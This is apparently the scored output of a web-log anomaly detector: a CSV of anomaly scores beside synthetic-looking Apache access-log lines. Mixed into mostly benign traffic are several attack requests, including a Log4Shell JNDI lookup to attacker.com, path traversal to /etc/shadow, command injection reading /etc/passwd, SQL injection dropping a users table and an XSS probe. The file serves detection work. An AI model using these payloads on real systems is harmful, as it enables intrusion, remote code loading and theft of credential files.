score_content,score_session,score_fused,score_fused_norm,line
1.9523189067840576,,1.9523189067840576,1.9523189067840576,234.121.194.138 - - [10/Jan/2025:12:04:56 +0000] "GET /profile HTTP/1.1" 200 18097 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.0220797061920166,,2.0220797061920166,2.0220797061920166,181.93.20.235 - - [10/Jan/2025:12:04:57 +0000] "GET /about HTTP/1.1" 200 17407 "-" "python-requests/2.31.0"
1.816688060760498,,1.816688060760498,1.816688060760498,43.84.219.134 - - [10/Jan/2025:12:04:57 +0000] "GET /api/products HTTP/1.1" 200 5010 "-" "Wget/1.20.3 (linux-gnu)"
23.536706924438477,,23.536706924438477,23.536706924438477,115.208.15.117 - - [10/Jan/2025:12:05:02 +0000] "GET /search?q=headphones HTTP/1.1" 200 16823 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.33351126313209534,,0.33351126313209534,0.33351126313209534,186.6.102.66 - - [10/Jan/2025:12:05:05 +0000] "GET /index.html HTTP/1.1" 200 10198 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.7098579406738281,,1.7098579406738281,1.7098579406738281,139.16.240.229 - - [10/Jan/2025:12:05:09 +0000] "GET /server-status HTTP/1.1" 200 2189 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.244778633117676,,3.244778633117676,3.244778633117676,96.229.98.115 - - [10/Jan/2025:12:05:09 +0000] "GET /assets/app.js HTTP/1.1" 304 13874 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.22959494590759277,,0.22959494590759277,0.22959494590759277,31.46.138.101 - - [10/Jan/2025:12:05:09 +0000] "GET /assets/app.css HTTP/1.1" 204 11495 "https://www.google.com/" "python-requests/2.31.0"
5.142276763916016,,5.142276763916016,5.142276763916016,119.173.185.140 - - [10/Jan/2025:12:05:14 +0000] "GET / HTTP/1.1" 302 9876 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
23.570234298706055,,23.570234298706055,23.570234298706055,71.49.240.225 - - [10/Jan/2025:12:05:17 +0000] "GET /api/product?id=123 HTTP/1.1" 200 5183 "-" "sqlmap/1.5.10#stable"
23.57355499267578,,23.57355499267578,23.57355499267578,62.53.18.26 - - [10/Jan/2025:12:05:17 +0000] "GET /search?q=phone HTTP/1.1" 201 612 "-" "python-requests/2.31.0"
0.2944428026676178,,0.2944428026676178,0.2944428026676178,103.113.60.139 - - [10/Jan/2025:12:05:20 +0000] "GET /index.html HTTP/1.1" 200 1549 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9901305437088013,,1.9901305437088013,1.9901305437088013,82.148.154.198 - - [10/Jan/2025:12:05:21 +0000] "GET /logout HTTP/1.1" 200 18977 "https://example.com/" "sqlmap/1.5.10#stable"
11042.8232421875,,11042.8232421875,11042.8232421875,57.106.77.71 - - [10/Jan/2025:12:05:22 +0000] "GET /assets/app.css HTTP/1.1" 502 1067 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.26665163040161133,,0.26665163040161133,0.26665163040161133,143.127.13.249 - - [10/Jan/2025:12:05:26 +0000] "GET /assets/app.js HTTP/1.1" 201 14098 "https://news.ycombinator.com/" "curl/7.68.0"
23.602100372314453,,23.602100372314453,23.602100372314453,97.48.194.138 - - [10/Jan/2025:12:05:30 +0000] "GET /search?q=phone HTTP/1.1" 200 9926 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
3.1685502529144287,,3.1685502529144287,3.1685502529144287,144.106.248.107 - - [10/Jan/2025:12:05:31 +0000] "GET /assets/app.css HTTP/1.1" 304 1988 "https://twitter.com/" "python-requests/2.31.0"
1.959302544593811,,1.959302544593811,1.959302544593811,237.116.217.95 - - [10/Jan/2025:12:05:32 +0000] "GET /login HTTP/1.1" 200 2690 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.36725035309791565,,0.36725035309791565,0.36725035309791565,155.11.224.19 - - [10/Jan/2025:12:05:37 +0000] "GET /index.html HTTP/1.1" 200 19923 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8446927070617676,,1.8446927070617676,1.8446927070617676,78.245.233.4 - - [10/Jan/2025:12:05:42 +0000] "GET /api/products HTTP/1.1" 200 11010 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30134.8359375,,30134.8359375,30134.8359375,155.181.53.102 - - [10/Jan/2025:12:05:47 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 404 1424 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
23.588472366333008,,23.588472366333008,23.588472366333008,79.67.93.132 - - [10/Jan/2025:12:05:49 +0000] "GET /search?q=laptop HTTP/1.1" 200 11872 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
26.4619083404541,,26.4619083404541,26.4619083404541,235.53.95.81 - - [10/Jan/2025:12:05:49 +0000] "GET /search?q=headphones HTTP/1.1" 302 10593 "-" "Wget/1.20.3 (linux-gnu)"
0.2587091326713562,,0.2587091326713562,0.2587091326713562,240.150.149.185 - - [10/Jan/2025:12:05:53 +0000] "GET /assets/app.css HTTP/1.1" 200 18230 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
23.58479118347168,,23.58479118347168,23.58479118347168,128.141.168.242 - - [10/Jan/2025:12:05:54 +0000] "GET /api/product?id=123 HTTP/1.1" 200 8152 "https://example.com/" "sqlmap/1.5.10#stable"
11066.24609375,,11066.24609375,11066.24609375,190.126.118.44 - - [10/Jan/2025:12:05:56 +0000] "GET /search?q=headphones HTTP/1.1" 500 1314 "https://example.com/" "sqlmap/1.5.10#stable"
23.88042449951172,,23.88042449951172,23.88042449951172,254.165.246.16 - - [10/Jan/2025:12:05:57 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 17864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9846755266189575,,1.9846755266189575,1.9846755266189575,18.182.39.3 - - [10/Jan/2025:12:06:02 +0000] "GET /admin HTTP/1.1" 200 7683 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
23.478727340698242,,23.478727340698242,23.478727340698242,2.137.142.106 - - [10/Jan/2025:12:06:05 +0000] "GET /search?q=headphones HTTP/1.1" 204 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9745560884475708,,1.9745560884475708,1.9745560884475708,207.241.233.46 - - [10/Jan/2025:12:06:09 +0000] "GET /logout HTTP/1.1" 200 14209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.44549560546875,,23.44549560546875,23.44549560546875,209.91.69.204 - - [10/Jan/2025:12:06:13 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 201 8371 "-" "dirb/2.22"
23.569721221923828,,23.569721221923828,23.569721221923828,77.176.212.218 - - [10/Jan/2025:12:06:15 +0000] "GET /search?q=camera HTTP/1.1" 200 7500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.54302215576172,,23.54302215576172,23.54302215576172,164.3.180.44 - - [10/Jan/2025:12:06:15 +0000] "GET /search?q=laptop HTTP/1.1" 200 1938 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8246722221374512,,1.8246722221374512,1.8246722221374512,230.136.236.11 - - [10/Jan/2025:12:06:18 +0000] "GET /dashboard HTTP/1.1" 200 3224 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.475685119628906,,23.475685119628906,23.475685119628906,176.237.72.231 - - [10/Jan/2025:12:06:23 +0000] "GET /search?q=headphones HTTP/1.1" 200 2536 "https://twitter.com/" "python-requests/2.31.0"
23.603818893432617,,23.603818893432617,23.603818893432617,151.37.193.211 - - [10/Jan/2025:12:06:28 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 6888 "-" "dirb/2.22"
23.604217529296875,,23.604217529296875,23.604217529296875,174.230.139.85 - - [10/Jan/2025:12:06:30 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12851 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
1.940160870552063,,1.940160870552063,1.940160870552063,60.215.20.88 - - [10/Jan/2025:12:06:35 +0000] "GET /profile HTTP/1.1" 200 14422 "https://twitter.com/" "python-requests/2.31.0"
1.8537291288375854,,1.8537291288375854,1.8537291288375854,201.116.126.59 - - [10/Jan/2025:12:06:39 +0000] "GET /dashboard HTTP/1.1" 200 9056 "https://twitter.com/" "curl/7.68.0"
23.5799560546875,,23.5799560546875,23.5799560546875,205.64.183.19 - - [10/Jan/2025:12:06:42 +0000] "GET /search?q=laptop HTTP/1.1" 200 9778 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.167832136154175,,3.167832136154175,3.167832136154175,93.28.24.2 - - [10/Jan/2025:12:06:43 +0000] "GET /assets/app.css HTTP/1.1" 302 10476 "https://news.ycombinator.com/" "curl/7.68.0"
1.9056452512741089,,1.9056452512741089,1.9056452512741089,111.115.143.143 - - [10/Jan/2025:12:06:45 +0000] "GET /contact HTTP/1.1" 200 6240 "https://news.ycombinator.com/" "python-requests/2.31.0"
23.566600799560547,,23.566600799560547,23.566600799560547,154.201.84.222 - - [10/Jan/2025:12:06:45 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 19660 "-" "dirb/2.22"
4.963968276977539,,4.963968276977539,4.963968276977539,232.251.63.147 - - [10/Jan/2025:12:06:47 +0000] "GET /about HTTP/1.1" 302 18434 "https://www.google.com/" "python-requests/2.31.0"
0.22444361448287964,,0.22444361448287964,0.22444361448287964,127.38.17.43 - - [10/Jan/2025:12:06:52 +0000] "GET /assets/app.css HTTP/1.1" 200 8895 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
1.9869972467422485,,1.9869972467422485,1.9869972467422485,185.161.127.153 - - [10/Jan/2025:12:06:55 +0000] "GET /about HTTP/1.1" 200 8180 "https://www.google.com/" "python-requests/2.31.0"
23.605016708374023,,23.605016708374023,23.605016708374023,86.216.159.98 - - [10/Jan/2025:12:06:58 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 13066 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.26361405849456787,,0.26361405849456787,0.26361405849456787,243.178.52.123 - - [10/Jan/2025:12:07:00 +0000] "GET /assets/app.css HTTP/1.1" 200 19866 "https://www.google.com/" "curl/7.68.0"
4.920095443725586,,4.920095443725586,4.920095443725586,248.148.201.63 - - [10/Jan/2025:12:07:03 +0000] "GET /logout HTTP/1.1" 302 16189 "https://news.ycombinator.com/" "curl/7.68.0"
23.61145782470703,,23.61145782470703,23.61145782470703,52.152.140.47 - - [10/Jan/2025:12:07:05 +0000] "GET /search?q=laptop HTTP/1.1" 200 18576 "https://twitter.com/" "sqlmap/1.5.10#stable"
30135.548828125,,30135.548828125,30135.548828125,113.205.75.213 - - [10/Jan/2025:12:07:05 +0000] "GET /search?q=camera HTTP/1.1" 429 429 "-" "sqlmap/1.5.10#stable"
0.2187795490026474,,0.2187795490026474,0.2187795490026474,65.169.40.184 - - [10/Jan/2025:12:07:08 +0000] "GET /assets/app.css HTTP/1.1" 201 8030 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
23.539209365844727,,23.539209365844727,23.539209365844727,130.237.236.223 - - [10/Jan/2025:12:07:08 +0000] "GET /search?q=headphones HTTP/1.1" 200 17610 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
26.488527297973633,,26.488527297973633,26.488527297973633,153.164.235.22 - - [10/Jan/2025:12:07:12 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 301 17693 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2086104303598404,,0.2086104303598404,0.2086104303598404,145.252.166.174 - - [10/Jan/2025:12:07:17 +0000] "GET /assets/app.js HTTP/1.1" 204 1551 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
23.570091247558594,,23.570091247558594,23.570091247558594,67.57.131.192 - - [10/Jan/2025:12:07:19 +0000] "GET /search?q=phone HTTP/1.1" 200 3331 "https://twitter.com/" "python-requests/2.31.0"
23.604461669921875,,23.604461669921875,23.604461669921875,119.198.174.151 - - [10/Jan/2025:12:07:23 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12916 "https://twitter.com/" "sqlmap/1.5.10#stable"
2.2034013271331787,,2.2034013271331787,2.2034013271331787,107.236.247.22 - - [10/Jan/2025:12:07:24 +0000] "GET / HTTP/1.1" 200 9780 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.59504508972168,,26.59504508972168,26.59504508972168,124.90.122.25 - - [10/Jan/2025:12:07:26 +0000] "GET /search?q=camera HTTP/1.1" 304 17175 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
3.225219964981079,,3.225219964981079,3.225219964981079,6.218.88.166 - - [10/Jan/2025:12:07:28 +0000] "GET /wp-login.php HTTP/1.1" 304 3871 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.25646018981933594,,0.25646018981933594,0.25646018981933594,144.110.246.119 - - [10/Jan/2025:12:07:33 +0000] "GET /assets/app.js HTTP/1.1" 200 10945 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.586729049682617,,23.586729049682617,23.586729049682617,116.152.110.100 - - [10/Jan/2025:12:07:38 +0000] "GET /search?q=phone HTTP/1.1" 200 6565 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0229785442352295,,2.0229785442352295,2.0229785442352295,48.94.84.51 - - [10/Jan/2025:12:07:39 +0000] "GET /about HTTP/1.1" 200 17692 "-" "Wget/1.20.3 (linux-gnu)"
23.5131778717041,,23.5131778717041,23.5131778717041,153.100.157.101 - - [10/Jan/2025:12:07:41 +0000] "GET /search?q=headphones HTTP/1.1" 200 10369 "-" "python-requests/2.31.0"
23.578460693359375,,23.578460693359375,23.578460693359375,236.158.152.22 - - [10/Jan/2025:12:07:43 +0000] "GET /search?q=camera HTTP/1.1" 201 9846 "https://www.google.com/" "sqlmap/1.5.10#stable"
23.602262496948242,,23.602262496948242,23.602262496948242,178.37.131.100 - - [10/Jan/2025:12:07:45 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 12332 "https://twitter.com/" "dirb/2.22"
23.63030242919922,,23.63030242919922,23.63030242919922,178.236.166.239 - - [10/Jan/2025:12:07:46 +0000] "GET /search?q=phone HTTP/1.1" 200 17708 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.24779437482357025,,0.24779437482357025,0.24779437482357025,159.14.222.92 - - [10/Jan/2025:12:07:47 +0000] "GET /assets/app.css HTTP/1.1" 200 14878 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11066.3115234375,,11066.3115234375,11066.3115234375,168.127.105.176 - - [10/Jan/2025:12:07:48 +0000] "GET /search?q=laptop HTTP/1.1" 500 1035 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
23.542346954345703,,23.542346954345703,23.542346954345703,8.204.195.57 - - [10/Jan/2025:12:07:53 +0000] "GET /search?q=headphones HTTP/1.1" 200 18626 "-" "curl/7.68.0"
1.9776195287704468,,1.9776195287704468,1.9776195287704468,145.191.198.197 - - [10/Jan/2025:12:07:55 +0000] "GET /logout HTTP/1.1" 200 15085 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.33275312185287476,,0.33275312185287476,0.33275312185287476,211.254.94.139 - - [10/Jan/2025:12:07:59 +0000] "GET /.git/config HTTP/1.1" 200 17896 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.594554901123047,,23.594554901123047,23.594554901123047,77.224.9.116 - - [10/Jan/2025:12:08:03 +0000] "GET /search?q=phone HTTP/1.1" 200 8211 "https://example.com/" "curl/7.68.0"
4.893136978149414,,4.893136978149414,4.893136978149414,54.208.189.151 - - [10/Jan/2025:12:08:03 +0000] "GET /contact HTTP/1.1" 304 7864 "https://example.com/" "sqlmap/1.5.10#stable"
23.576995849609375,,23.576995849609375,23.576995849609375,201.53.209.53 - - [10/Jan/2025:12:08:08 +0000] "GET /search?q=phone HTTP/1.1" 200 4662 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.25124022364616394,,0.25124022364616394,0.25124022364616394,75.147.69.244 - - [10/Jan/2025:12:08:10 +0000] "GET /assets/app.js HTTP/1.1" 200 9689 "-" "python-requests/2.31.0"
30134.4140625,,30134.4140625,30134.4140625,222.168.33.180 - - [10/Jan/2025:12:08:11 +0000] "GET /search?q=phone HTTP/1.1" 404 567 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.552568435668945,,26.552568435668945,26.552568435668945,126.37.148.162 - - [10/Jan/2025:12:08:12 +0000] "GET /api/product?id=123 HTTP/1.1" 302 12968 "https://news.ycombinator.com/" "curl/7.68.0"
1.9916656017303467,,1.9916656017303467,1.9916656017303467,178.240.225.95 - - [10/Jan/2025:12:08:15 +0000] "GET /about HTTP/1.1" 200 9216 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
4.953258991241455,,4.953258991241455,4.953258991241455,163.171.179.92 - - [10/Jan/2025:12:08:17 +0000] "GET /about HTTP/1.1" 302 15122 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30134.2265625,,30134.2265625,30134.2265625,69.83.213.73 - - [10/Jan/2025:12:08:20 +0000] "GET /search?q=phone HTTP/1.1" 400 1013 "https://twitter.com/" "curl/7.68.0"
26.80303192138672,,26.80303192138672,26.80303192138672,12.26.161.201 - - [10/Jan/2025:12:08:24 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 304 1686 "-" "nikto/2.5.0"
0.29177236557006836,,0.29177236557006836,0.29177236557006836,254.246.110.52 - - [10/Jan/2025:12:08:24 +0000] "GET /assets/app.js HTTP/1.1" 200 122 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.0028159618377686,,2.0028159618377686,2.0028159618377686,65.22.96.171 - - [10/Jan/2025:12:08:29 +0000] "GET /login HTTP/1.1" 200 11910 "https://www.google.com/" "sqlmap/1.5.10#stable"
4.887191295623779,,4.887191295623779,4.887191295623779,110.168.24.181 - - [10/Jan/2025:12:08:29 +0000] "GET /logout HTTP/1.1" 302 7772 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2552354037761688,,0.2552354037761688,0.2552354037761688,175.114.3.3 - - [10/Jan/2025:12:08:30 +0000] "GET /assets/app.css HTTP/1.1" 200 17121 "https://example.com/" "sqlmap/1.5.10#stable"
26.551328659057617,,26.551328659057617,26.551328659057617,19.59.99.23 - - [10/Jan/2025:12:08:30 +0000] "GET /search?q=phone HTTP/1.1" 301 15753 "-" "sqlmap/1.5.10#stable"
1.931543231010437,,1.931543231010437,1.931543231010437,165.174.37.18 - - [10/Jan/2025:12:08:30 +0000] "GET /logout HTTP/1.1" 200 4462 "https://twitter.com/" "python-requests/2.31.0"
0.23939655721187592,,0.23939655721187592,0.23939655721187592,161.192.39.236 - - [10/Jan/2025:12:08:30 +0000] "GET /assets/app.js HTTP/1.1" 200 7081 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.8081475496292114,,1.8081475496292114,1.8081475496292114,36.193.32.151 - - [10/Jan/2025:12:08:35 +0000] "GET /api/products HTTP/1.1" 200 3392 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.829700946807861,,4.829700946807861,4.829700946807861,71.166.22.64 - - [10/Jan/2025:12:08:37 +0000] "GET /dashboard HTTP/1.1" 304 8219 "https://twitter.com/" "python-requests/2.31.0"
4.902342796325684,,4.902342796325684,4.902342796325684,218.217.169.225 - - [10/Jan/2025:12:08:41 +0000] "GET /logout HTTP/1.1" 304 978 "https://www.google.com/" "curl/7.68.0"
4.780038833618164,,4.780038833618164,4.780038833618164,166.14.201.230 - - [10/Jan/2025:12:08:45 +0000] "GET /api/products HTTP/1.1" 302 9784 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.81450080871582,,23.81450080871582,23.81450080871582,136.228.251.4 - - [10/Jan/2025:12:08:48 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 201 2426 "https://example.com/" "sqlmap/1.5.10#stable"
23.582691192626953,,23.582691192626953,23.582691192626953,196.121.245.253 - - [10/Jan/2025:12:08:49 +0000] "GET /search?q=phone HTTP/1.1" 200 5761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.779388427734375,,23.779388427734375,23.779388427734375,243.203.102.130 - - [10/Jan/2025:12:08:53 +0000] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2081 "https://twitter.com/" "python-requests/2.31.0"
23.60869789123535,,23.60869789123535,23.60869789123535,138.158.40.72 - - [10/Jan/2025:12:08:56 +0000] "GET /search?q=laptop HTTP/1.1" 200 17682 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11044.1611328125,,11044.1611328125,11044.1611328125,138.84.101.151 - - [10/Jan/2025:12:08:56 +0000] "GET /api/products HTTP/1.1" 500 318 "-" "sqlmap/1.5.10#stable"
23.558652877807617,,23.558652877807617,23.558652877807617,237.112.30.117 - - [10/Jan/2025:12:08:58 +0000] "GET /api/product?id=123 HTTP/1.1" 200 2925 "https://twitter.com/" "python-requests/2.31.0"
0.2268136888742447,,0.2268136888742447,0.2268136888742447,180.3.42.128 - - [10/Jan/2025:12:08:58 +0000] "GET /assets/app.js HTTP/1.1" 200 4596 "https://twitter.com/" "curl/7.68.0"
1.9672948122024536,,1.9672948122024536,1.9672948122024536,192.200.224.69 - - [10/Jan/2025:12:09:02 +0000] "GET /login HTTP/1.1" 200 4259 "-" "sqlmap/1.5.10#stable"
23.565202713012695,,23.565202713012695,23.565202713012695,68.183.250.148 - - [10/Jan/2025:12:09:02 +0000] "GET /search?q=phone HTTP/1.1" 200 2192 "-" "sqlmap/1.5.10#stable"
1.9540969133377075,,1.9540969133377075,1.9540969133377075,43.95.41.66 - - [10/Jan/2025:12:09:05 +0000] "GET /profile HTTP/1.1" 200 18675 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.558452606201172,,26.558452606201172,26.558452606201172,12.220.221.4 - - [10/Jan/2025:12:09:10 +0000] "GET /api/product?id=123 HTTP/1.1" 302 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.19173799455165863,,0.19173799455165863,0.19173799455165863,142.206.234.183 - - [10/Jan/2025:12:09:13 +0000] "GET /assets/app.css HTTP/1.1" 200 1258 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30134.408203125,,30134.408203125,30134.408203125,70.212.20.147 - - [10/Jan/2025:12:09:14 +0000] "GET /search?q=phone HTTP/1.1" 404 655 "-" "curl/7.68.0"
0.3583155870437622,,0.3583155870437622,0.3583155870437622,252.12.245.103 - - [10/Jan/2025:12:09:18 +0000] "GET /index.html HTTP/1.1" 200 17000 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.987831950187683,,1.987831950187683,1.987831950187683,117.3.95.52 - - [10/Jan/2025:12:09:20 +0000] "GET /logout HTTP/1.1" 200 18223 "https://twitter.com/" "curl/7.68.0"
23.626201629638672,,23.626201629638672,23.626201629638672,249.127.198.199 - - [10/Jan/2025:12:09:22 +0000] "GET /api/product?id=123 HTTP/1.1" 200 19488 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.6307315826416,,23.6307315826416,23.6307315826416,89.163.215.178 - - [10/Jan/2025:12:09:23 +0000] "GET /search?q=phone HTTP/1.1" 200 17845 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30134.244140625,,30134.244140625,30134.244140625,79.27.53.136 - - [10/Jan/2025:12:09:23 +0000] "GET /search?q=laptop HTTP/1.1" 401 1489 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.132624864578247,,3.132624864578247,3.132624864578247,12.236.60.230 - - [10/Jan/2025:12:09:26 +0000] "GET /assets/app.css HTTP/1.1" 302 3148 "https://news.ycombinator.com/" "python-requests/2.31.0"
11066.3642578125,,11066.3642578125,11066.3642578125,149.25.130.35 - - [10/Jan/2025:12:09:31 +0000] "GET /search?q=camera HTTP/1.1" 500 173 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.3058110475540161,,0.3058110475540161,0.3058110475540161,61.75.67.218 - - [10/Jan/2025:12:09:31 +0000] "GET /index.html HTTP/1.1" 200 4383 "https://news.ycombinator.com/" "curl/7.68.0"
1.853529453277588,,1.853529453277588,1.853529453277588,60.20.242.52 - - [10/Jan/2025:12:09:36 +0000] "GET /dashboard HTTP/1.1" 200 9011 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
